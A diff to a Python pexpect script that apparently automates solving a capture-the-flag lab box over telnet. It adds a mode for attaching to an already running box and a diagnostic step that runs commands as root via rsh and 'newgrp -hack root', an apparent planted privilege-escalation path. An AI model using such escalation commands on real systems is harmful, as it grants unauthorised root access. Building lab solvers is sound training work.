@@ -74,8 +74,12 @@ def wait_telnet(deadline):
 def expect_prompt(child, prompt, tmo=60):
     child.expect(prompt, timeout=tmo)
 
+NO_BOOT = os.environ.get("BOX_NO_BOOT")   # connect to an already-running box (e.g. play.sh)
+
 def main():
-    box = boot_box()
+    box = None if NO_BOOT else boot_box()
+    if NO_BOOT:
+        log("BOX_NO_BOOT: solving an already-running box on 127.0.0.1:%s" % TPORT)
     try:
         if not wait_telnet(time.time() + 600):
             log("telnetd never came up — see %s" % SERLOG); return 1
@@ -172,6 +176,19 @@ def main():
         if not flag:
             log("LOOT FAILED: only the decoy after retries — gen-flag/MFS not materialising the real flag"); return 5
         log("flag recovered: %s" % flag)
+
+        # diagnostic: capture how gen-flag materialised the flag (MFS overlay +
+        # its own boot trace) so the off-disk path is a logged fact, not inferred.
+        try:
+            tn.sendline("echo 'mount | grep maniac; echo ---; cat /root/.genflag.log' "
+                        "| rsh localhost -l %s 'newgrp -hack root' 2>&1" % DUSER)
+            tn.expect(r"BRIAN> ", timeout=60)
+            for ln in tn.before.splitlines():
+                ln = ln.strip()
+                if "maniac" in ln or "mount_mfs" in ln or "MFS overlay" in ln:
+                    log("genflag: %s" % ln)
+        except (pexpect.TIMEOUT, pexpect.EOF):
+            pass
         if EXPECT and flag != EXPECT:
             log("FLAG MISMATCH: got %s, expected %s" % (flag, EXPECT)); return 6
 
@@ -183,9 +200,10 @@ def main():
             SERLOG.replace(".log", "-telnet.log")))
         return 1
     finally:
-        reap()
-        if box.poll() is None:
-            box.terminate()
+        if not NO_BOOT:            # leave an externally-managed (play.sh) box alone
+            reap()
+            if box is not None and box.poll() is None:
+                box.terminate()
 
 if __name__ == "__main__":
     sys.exit(main())
